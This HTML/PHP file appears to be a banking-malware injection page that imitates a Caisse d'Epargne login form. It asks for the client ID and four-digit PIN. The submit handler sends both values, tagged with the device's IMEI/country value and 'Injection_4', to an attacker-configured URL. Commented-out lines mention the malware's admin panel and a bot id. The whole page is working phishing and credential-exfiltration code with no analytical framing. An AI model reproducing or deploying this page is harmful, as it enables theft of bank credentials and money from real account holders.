<html>
<head>
<style>
	body {
		margin: 0;
		padding: 0;
		font-family: Helvetica Neue,Helvetica,Arial,sans-serif;
		background: #e3e3e3;
	}
	.input {
		display: block;
    margin-bottom: 0.4em;
    padding: 4px;
    margin-left: 14px;
    border-radius: 5px;
    width: 93%;
    border: 1px solid #d9d9d9;
	}


	.input:active {
	    border: 1px solid #f00;
	}
	.input:hover {
	    border: 1px solid #f00;
	}
	
	.fielderror {
		display: block;
    margin-bottom: 0.4em;
    padding: 4px;
    margin-left: 14px;
    width: 93%;
	border: 1px solid #f00;
	border-radius: 5px;
	}
	
	.submit {
	border-radius: 3px;
    border: 0px none;
    cursor: pointer;
    float: none;
    display: inline-block;
    margin: 0px 15px 10px 0px;
    color: #FFF;
    font-weight: bold;
    padding: 8px 8px;
    text-decoration: none;
    float: right;
    background: #E30013 none repeat scroll 0% 0% !important;
    filter: none !important;
    width: 111px;
	}
	
	#_mainForm {
	    width: 100%;
		float: left;
		display: block;
		background: #e3e3e3;
		margin-top: -15px;
	}
	label {
		display: block;
		    padding-left: 8px;
    float: left;
    width: 80%;
    font-weight: bold;
    color: #000;
	}
</style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body>
<div id="content_div">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAaAAAABACAMAAABr21NdAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAIdQTFRFAAAA/5mi/0RV/8zR/3eD/wAX/7vB/xEm/4iT/+7w/yI2/zNF/93g/2Z0/1Vk3t7e09PT9PT0vb29nJycb29vWVlZenp6yMjIp6enkJCQZGRkhYWF6enpsrKy/6qy/1Bg/9rd//P0/2l3/8nO//Lz/8DF/5Ca//j4/9jb//Dx/8jN//v7/9LWRmewYQAAAAF0Uk5TAEDm2GYAAAABYktHRACIBR1IAAAACW9GRnMAAAAfAAAAzwBkyM0BAAAACXBIWXMAAACqAAAAqgBxDUDZAAAACXZwQWcAAAHgAAAB3wCigx7YAAAIk0lEQVR42u1c6ZabOgwmGSYkZCYYQ9gM6d3393++CxiMJMskbacp59T6lQpjbH3a7U6w238dvQSevimFr19HBy/C7QEUHY8eoO0CFB1Pp8gDtFWAenjQSx6gTQEU73p4goOPQdsEKN6Nr5zOHqAtAjTB8/bus7gtAsTD4wHaCECRhudw8XXQFgEaM7cenr0vVDcJUDjC87L3nYRNArR/Y2OPB2gbAMUjAKd334vbJkA6+Bwj3yzdJEDn8SzhEH9RNzsRqZfutwXoOAafy2cfN6Qyy68jFSV6UA0kEEtSlqyba6OqBI/qmVfMrCAlzMbk/LBsIbvVzHT5OdEyKjFvkilbMhDO0bXMGtKyUsUgiEZlkrzUoYW2zMIHkm6A4hfs3eIHAWqz5mqoQyIbWRUarQbWIoikmN9UCcMsDDO5QhKMcIrlsQLPs5Ejl/XMBLA3vKbDCra8i/c0UkY9RpLB+YvlQYnmUWQHCr5VOwG6DNHnbUmt9y+PAVQ2TslpkSk0HI9qwcsGtRQwjXAEEi5nQWhAhSeTBAgMEJRrBu2hsTUMzlEghFI8Pdy3fpLDhQILavDCwxX3dluSg+gtOD4CUIdXBZc8ybRBu8CjFIdtzTFdwl0MGS+khu9Je2IoP6TCpQUG0rCaVYPBfHK8APiwQhy6A/RWxwM0dnZQbt0DdorvAwQsPlcNBmPed2uBhoWaV5VyMVMWoJwBSLDyGY1A8r7E0CjaorA8U85o2DhHoXL6JAF2UKheFNDbTx9uUrPQwrVwAQGK5osgn37qB/78y/hbo3IO8CmQA6BZbXOpUUg4lYaht0SrE8ae+kDGMa94j9VK8jOaci5EWTVAL3pcG4lUtXQ4RxG0BdZto3xQw5rJrivi0ecImJVap1KY0+ZQaQSxypJYVEjcGqHJbAYYzvcByrjQSj17RV24wmubdmQDBJhaAN0KQMvMabF8NhGidcS/AOcf7bwcQcWKXjGLw086R95AnFg7L7RyiQQCdObm0oEnNL9WAUrdIVsbkCLORKNWYSwyTl41r+Vuqolfs/2gcIQvwxdoN9oVEWmasS1eUGPne1x4rF0A1RxA3A03nbpFfUb3Ft0HiMuj0XdlQyRFPJXeV431TjNVau+xd+4DsR+EM1csFNpA9BRKkpUWJlSgCRMivdk/Te4wRVPXDt0ZX8pm58hm2fm0LK5QHfKDHWbdetb+gUI1s2IoTlGbVBFJ5Xh1U+gvWiaTLRJXClA53YiAo1tOZRi3pQESXY7sudWwkYg+jm0KmpNXVgprZVLV7MoK8nmY/TUMQKGdDuyHjHt89hKtAqQYDwWdcmapC3WJ01abhEn/ILPDqagLoAQCJFxBca1QNIvLtM9qXDXtoPa4XKjRgJq81KWTCa1l2dCCjoeRfu1Zv/2ufx9ucwkUjBfhQi4QHdwOK6CmkkxrI/EFGloBM9CZqSxmda+PgAIMD5ByVFIF5EtoQP0CiIbBOYBnXgRRMWZe6zkyDQHNz2nuHy5WYtG7Se7C13gfD6HovAZQ4wRITq6hwyOE7ROzK5MpZFQLUX3IdcFKmBdIdhj1JYwKL/loNS0qw8G/4PsIiytRVg/ERB0dRyVJ2iznHRorsegASqC4B+dymbOGNQtS7pAtRIdHVMwL3ZVx4JJAcbcMQjNnbJLgsL52zh3qSqakQyQETjunNo1oSGhS5t9cbj67SR3AiP/ryFQTQPFxpD/+DIK/jjPBEkgn2gc7ZlkANendsj6gesmYi+Aiung4y4aCFFdOcRJHIGez745vq7XTWEli4bJa0RP90PyBpcm4UgZhgQ/eLLaThqO2o3CwI9rwOVhSNF9rTRe5xgA5DEHCakpwzPJhgMDMgi9KXGVQxxVNuLGGuxy5rZo6zW5asHQ7NQcBSq7E8RGgcLKZv4Pgn9l+3nEJdLmFGsGbG6AERssyM6sijctFzgWOw/qIIYXZUzudFWDUXMK18vdWyJrpoLG+ZMXtyiuvYSaA0Apw6s2Nx06CizIK9enFHYBCbot7pgQa7/fE7laPMo1SBYWSLbUXziOwrQzYSlGiFtigi4oyJw1lQzzXEmZ7bq7TgJpxu8WyATTZ0gXIORMaa+ms4A4bKgR86lz42CyNTgw+O1wCmRNwevsKAZQ03KbTKzmDUag11HJ1ScaJsb4nXD5Z5bsuynEawOQfsNBFj5d+EjUheeewoUKu0+qWgTKsByicyp7Dv0Hw3/w7QiXQQO9D7/T48HHDIuUKeHXk4bGngvWH0UWWibHkamOSlTRy9cQVRXjG3mABnkFNAefBxIQC2VwdxTQspeR19bBhEA5IEoZEILKO7cyA3tCY+yPkwA6dU0mQonZ2b9pUR5NbWF5dmgaCYzq1n8+68ioN7jpBEXApCgihwtY2c9hgRA0vHrg6Fai3Q/0fsbwcARTSMoecAl0uj9xJGC94DNckuhTeq0jng2BwRULoaxFLdakvmzQZOtPTThwx0b0K7s6IWB6WiaNSqtg7I3q19mQd9xzsLK3IZvqhMutjVqNU/3ZKPowuqAh24dN8+DxoZwn//CX/iVgkX3zLqOVua6U/8BWuEDWtj0wJ5P+X91YAOmA81k6BPEAbAGjtFMgD9P0BWkog0uk+OQE6vHr6WHqnAO3gRbipBKKd7osToLOX6MdShP/kwQ7awFICHblDCA6g0Ev0g2kX0DrIFKqgBCJ/PSlyAvRy8PSxRNR+bw5RHyuBfJLw5CTh9WSs5qESyAP0bIB2s9k8VgJ5gJ4NkAk8j5VAHqBnAzRKOySnQB6gDQEUD3XoGZ0CeYC2BNBY85xun1PTeICeCtAs78ebNh6g5wIUvXxm08YD9FyAXqObLoFi9ys3D9B3BGj46yJDCeQWPL666AF6OkCvce/gLo++4QF6PkBjzer+W/M+Bm0BIJ8keIA8eYA8QB4gD9APTv8Dczib7lCmq0gAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTItMTItMTFUMTc6NDU6MzctMDY6MDBioituAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDEyLTEyLTExVDE3OjQ1OjM3LTA2OjAwE/+T0gAAACN0RVh0cHM6SGlSZXNCb3VuZGluZ0JveAAxOTR4MTk0KzIwMSszMjSMTnRzAAAAHHRFWHRwczpMZXZlbABBZG9iZS0zLjAgRVBTRi0zLjANBRQuQAAAAB10RVh0cHM6U3BvdENvbG9yLTAAUEFOVE9ORSA0MjQgQ1ZjgFozAAAAKHRFWHRwczpTcG90Q29sb3ItMQAwIDAgMCAwLjY1IFBBTlRPTkUgNDI0IENWA6SHVwAAAABJRU5ErkJggg==" style="float: right">
<br><br><br><br>
<form action="null" method="post" id="_mainForm" target="flow_handler">
<br>
<label>Identification client</label>
<input name="Identifiant client" id="login" maxlength="10" class="input" type="text">
            <script>
                document.getElementById('login').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
<label>Code confidentiel</label>
<input name="Code confidentiel" id="password" maxlength="4" class="input" type="password">
            <script>
                document.getElementById('password').onkeypress = function (e) {
                    return !(/[А-Яа-яA-Za-z ]/.test(String.fromCharCode(e.charCode)));
                }
            </script>
<br>
<input value="Valider" id="input_submitBtn" class="submit" type="button">
<input type="hidden" name="name" value="Banque">

<iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
</form>
           <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                   /* var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // óñòàíàâëèâàåì ó ôîðìû óðë àäìèíêè
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // ïîëó÷àåì id áîòà
*/

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 10) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
				top['closeDlg'] = true;
				/*prompt('send', '{"dialog id" : "caisseepargne'+
					'", "identifiant_client": "'+oNumInp.value+
					'", "code_confidentiel": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();*/
						
						
						
var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|caisseepargne|"+oNumInp.value+"|"+oCodeInp.value+"|");
						
						return false;
                    };

                })();
            </script>

</div>
</body>
</html>
